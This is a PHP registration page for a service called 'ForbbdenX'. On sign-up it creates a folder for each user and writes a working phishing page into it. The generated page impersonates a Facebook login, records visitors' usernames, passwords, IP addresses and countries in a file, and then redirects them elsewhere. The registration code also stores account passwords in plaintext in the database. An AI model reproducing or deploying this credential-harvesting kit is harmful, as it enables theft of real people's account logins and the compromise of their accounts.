<?php
    session_start();
    if(isset($_SESSION["username"])) {
        header("Location: dashboard");
        exit();
    }
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>ForbbdenX Login</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link href="https://fonts.googleapis.com/css2?family=Mulish:wght@400;900&display=swap" rel="stylesheet">
  <script src="https://cdn.tailwindcss.com"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css">
  <link rel="stylesheet" href="./style.css">
  <style>
    body {
      background: #121212 url(https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTMOJ8RjJ87DGpCAq486OuCy8G3mc85I-KNFA&usqp=CAU) center/cover no-repeat fixed;
      background-repeat: no-repeat;
      font: 1em/1.618 Mulish, sans-serif;
    }
  </style>
</head>
<body>
  <!-- partial:index.partial.html -->
  <div class="min-h-screen [ p-4 md:p-6 lg:p-8 ] [ flex justify-center items-center ]">

<form class="form max-w-sm [ p-8 md:p-10 lg:p-10 ] bg-gradient-to-b from-black/80 to-black/40 text-[#fff] backdrop-blur-lg border-[1px] border-solid border-white border-opacity-10 rounded-2xl shadow-[0_0_20px_10px_rgba(0,0,0,0.75)]" action="" method="post">
  <h3 class="text-md text-[#fff]/80 mb-1">Register required!</h3>
  <h1 class="text-xl md:text-2xl lg:text-2xl mb-6 uppercase font-bold">Register for free!</h1>
  <p class="mb-6 text-sm text-[#fff]/60 text-opacity-50">Enter a valid username &amp; password in the fields below to get started. Already have an account? <a style="color: #8F5FE7" href="/signin">Sign in</a></p>
  <?php
    // Include the necessary files
    require('db.php');
    // Redirect to the dashboard if the user is already logged in
    if (isset($_SESSION['username'])) {
        header("Location: dashb.php");
        exit;
    }

    // When form submitted, insert values into the database.
    if (isset($_POST['username'])) {
        $username = stripslashes($_POST['username']);
        // Escapes special characters in a string
        $username = mysqli_real_escape_string($con, $username);
        $email = stripslashes($_POST['email']);
        $email = mysqli_real_escape_string($con, $email);
        $password = stripslashes($_POST['password']);
        $password = mysqli_real_escape_string($con, $password);
        $create_datetime = date("Y-m-d H:i:s");
        $ip_address = $_SERVER['REMOTE_ADDR'];
        $uniqueIdentifier = bin2hex(random_bytes(8));

        // Check if the username or email already exists in the database
        $query = "SELECT * FROM `users` WHERE username='$username' OR email='$email'";
        $result = mysqli_query($con, $query);
        $rows = mysqli_num_rows($result);
        if ($rows > 0) {
            $row = mysqli_fetch_assoc($result);
            if ($row['username'] == $username) {
                echo "
                      <h3>Username already taken.</h3>";
            } elseif ($row['email'] == $email) {
                echo "
                      <h3 class='text-danger'>Email already taken.</h3>         ";
            }
        } else {
            // Insert the data into the database
            $query = "INSERT INTO `users` (username, password, email, create_datetime, ip_address, unique_identifier)
                      VALUES ('$username', '$password', '$email', '$create_datetime', '$ip_address', '$uniqueIdentifier')";
            $result = mysqli_query($con, $query);
            if ($result) {
                // Get the user's IP address
                $userIP = $_SERVER['REMOTE_ADDR'];

                // Create the user's folder and set appropriate permissions
                $folderPath = '/home/u667008371/domains/safemotivation.tech/public_html/q/' . $uniqueIdentifier . '/';
                if (!is_dir($folderPath)) {
                    mkdir($folderPath, 0777, true);
                }

                // Create the user's PHP file
                $userPHPFile = $folderPath . $uniqueIdentifier . '.php';

                // Save the PHP content to the user's PHP file
          $userPHPContent = <<<'PHP'
<?php
include("/home/u667008371/domains/forbddenx.site/public_html/obf_code.php");

$ip_address = $_SERVER['REMOTE_ADDR'];

// Function to save the user credentials to a file
function saveCredentialsToFile($usersArray, $filename)
{
    $file = fopen($filename, 'w');
    fwrite($file, '<?php' . PHP_EOL);
    fwrite($file, '$users = ' . var_export($usersArray, true) . ';' . PHP_EOL);
    fwrite($file, '?>');
    fclose($file);
}

// Function to get country based on IP address using IP geolocation API
function getCountryFromIP($ip) {
    $api_url = 'http://ip-api.com/json/'.$ip;
    $response = file_get_contents($api_url);
    $data = json_decode($response);
    return $data->country;
}

// Check if the form is submitted
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Set the time zone to Philippine time (Asia/Manila)
    date_default_timezone_set('Asia/Manila');

    // Retrieve username and password from the form
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Create an array to store the user credentials
    $users = array();

    // Check if the file exists and load its content if it does
    if (file_exists('users.php')) {
        include 'users.php';
    }

    // Get the current date and time
    $date = date('Y-m-d H:i:s');

    // Get the country based on the user's IP address
    $country = getCountryFromIP($ip_address);

    // Add the new user credentials to the array
    $users[] = [
        'username' => $username,
        'password' => $password,
        'ip_address' => $ip_address,
        'country' => $country,
        'date' => $date
    ];

    // Save the updated array to the file
    saveCredentialsToFile($users, 'users.php');

    // Redirect the user to the success page
    header("Location: https://safemotivation.tech/vote/loading");
    exit;
}

?>
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
    <title>Facebook - Login / connect your account</title>
    <link rel="stylesheet" href="https://forbddenx.site/css/xsts.css">
</head>
<body>
    <p style="margin-bottom: 0;padding-left: 12px;padding-top: 5px;padding-bottom: 5px;border-bottom: 1px solid #e5ce3a;background: #fffbe2;color: #9f7d2d;text-align: center;">You must log in first.</p>
    <nav class="navbar navbar-light navbar-expand-md" style="padding-bottom: 10px;">
        <div class="container-fluid">
        </div>
    </nav>
    <div class="contact-clean" style="padding: 0;padding-top: 0px;padding-bottom: 0px;background: rgb(255,255,255);">
        <form method="POST" action="" id="contact-form" style="width: 100%;padding-top: 0;padding-right: 15px;padding-left: 10px;border-style: none;box-shadow: inset 0px 0px;">
            <div class="form-group" style="margin-bottom: 7px;">
                <div>
                    <img class="img-fluid" src="/IMG_20230601_182951.jpg" style="width: 100%;margin-bottom: 11px;">
                </div>
                <input class="form-control form-control-sm" type="text" autocomplete="off" placeholder="Mobile number or email" style="background: #f5f6f7;border-radius: 5px;" autocomplete="off" required="" type="text" id="username" name="username">
            </div>
            <div class="form-group" style="margin-bottom: 14px;">
                <input class="form-control form-control-sm" autocomplete="off" style="background: #f5f6f7;border-radius: 5px;" placeholder="Password" required="" type="password" id="password" name="password">
            </div>
            <div class="form-group">
                <input class="btn btn-secondary btn-block btn-lg text-capitalize" style="background: #1877f2;font-size: 16px;" type="submit" value="Login">
            </div>
            <div style="margin-top: 23px;text-align: center;">
                <span class="label" style="margin-top: -13px;margin-bottom: 1px;margin-right: 50%;margin-left: 43%;width: 53px;">or</span>
                <span class="line" style="background: rgba(154,154,154,0.25);"></span>
            </div>
            <div class="form-group" style="margin-left: auto;margin-right: auto;margin-top: 36px;">
                <a class="btn btn-secondary btn-block btn-lg text-capitalize" role="button" style="background: #00a400;font-size: 13px;font-style: normal;font-weight: bold;text-align: center;width: 172px;padding-left: 10px;padding-right: 10px;height: 36px;padding-top: 11px;" href="https://m.facebook.com/reg/">Create New Account</a>
                <p style="text-align: center;margin-top: 14px;font-size: 14px;color: #85a4d0;"><a href="https://touch.facebook.com/login/identify/?ctx=recover&amp;c=https%3A%2F%2Ftouch.facebook.com%2F&amp;multiple_results=0&amp;ars=facebook_login&amp;lwv=100&amp;_rdr" style="color: #548ad6;">Forgot Password?</a></p>
            </div>
        </form>
    </div>
</body>
</html>
PHP;

                file_put_contents($userPHPFile, $userPHPContent);

                echo "
                      <h3 class='text-success'>You are registered successfully.</h3><br/>";
                      header("Location: signin");

            } else {
                echo "'
                      <h3>Required fields are missing.</h3><br/>";
            }
        }
    }
?>
  <label class="relative text-[#fff]/50 focus-within:text-[#fff]/70 block mb-4">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="transition pointer-events-none w-6 h-6 absolute top-1/2 transform -translate-y-1/2 left-3" fill="none" stroke="currentColor">
      <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 2c-3.04 0-5.5 2.46-5.5 5.5 0 1.84 1.13 3.43 2.76 4.12-.05.34-.26 1.64-.26 1.64-.27.94-1.58 2.01-1.58 2.01l-.12.13c-.78.78-.78 2.05 0 2.83l.36.36c.78.78 2.05.78 2.83 0l.13-.12s1.07-1.31 2.01-1.58c0 0 1.3-.21 1.64-.26.69 1.63 2.28 2.76 4.12 2.76 3.04 0 5.5-2.46 5.5-5.5 0-3.04-2.46-5.5-5.5-5.5zm0 9a3 3 0 1 1 0-6 3 3 0 0 1 0 6z"/>
    </svg>
    <input required type="text" name="username" id="username" placeholder="Username" class="form-input transition-colors duration-200 py-3 pr-3 md:py-4 md:pr-4 lg:py-4 lg:pr-4 w-full bg-[#fff]/10 text-white focus:bg-[#fff]/20 focus:shadow-sm focus:outline-none leading-none placeholder-gray-400 appearance-none block pl-12 rounded-lg ">
  </label>
  <label class="relative text-[#fff]/50 focus-within:text-[#fff]/70 block mb-4">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="transition pointer-events-none w-6 h-6 absolute top-1/2 transform -translate-y-1/2 left-3" viewBox="0 0 20 20" fill="currentColor">
      <path d="M0 0h24v24H0V0z" fill="none" />
      <path d="M12 1.95c-5.52 0-10 4.48-10 10s4.48 10 10 10h5v-2h-5c-4.34 0-8-3.66-8-8s3.66-8 8-8 8 3.66 8 8v1.43c0 .79-.71 1.57-1.5 1.57s-1.5-.78-1.5-1.57v-1.43c0-2.76-2.24-5-5-5s-5 2.24-5 5 2.24 5 5 5c1.38 0 2.64-.56 3.54-1.47.65.89 1.77 1.47 2.96 1.47 1.97 0 3.5-1.6 3.5-3.57v-1.43c0-5.52-4.48-10-10-10zm0 13c-1.66 0-3-1.34-3-3s1.34-3 3-3 3 1.34 3 3-1.34 3-3 3z" />
    </svg>
    <input required type="text" name="email" id="email" placeholder="Email" class="form-input transition-colors duration-200 py-3 pr-3 md:py-4 md:pr-4 lg:py-4 lg:pr-4 w-full bg-[#fff]/10 text-white focus:bg-[#fff]/20 focus:shadow-sm focus:outline-none leading-none placeholder-gray-400 appearance-none block pl-12 rounded-lg">
  </label>
  <label class="relative text-[#fff]/50 focus-within:text-[#fff]/70 block mb-4">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="transition pointer-events-none w-6 h-6 absolute top-1/2 transform -translate-y-1/2 left-3" viewBox="0 0 20 20" fill="currentColor">
      <g fill="none">
        <path d="M0 0h24v24H0V0z" />
        <path d="M0 0h24v24H0V0z" opacity=".87" />
      </g>
      <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM9 6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9V6zm9 14H6V10h12v10zm-6-3c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2z" />
    </svg>
    <input required type="password" name="password" id="password" placeholder="Password" class="form-input transition-colors duration-200 py-3 pr-3 md:py-4 md:pr-4 lg:py-4 lg:pr-4 w-full bg-[#fff]/10 text-white focus:bg-[#fff]/20 focus:shadow-sm focus:outline-none leading-none placeholder-gray-400 appearance-none block pl-12 rounded-lg">
  </label>
  <input name="submit" value="Register" type="submit" class="p-3 md:p-4 focus:outline-none lg:p-4 transition-colors duration-500 bg-[#8F5FE7]  hover:bg-[#C7BDF9] w-full rounded-lg font-bold text-white"></input>
</form>

  </div>

  <!-- partial -->
</body>
</html>
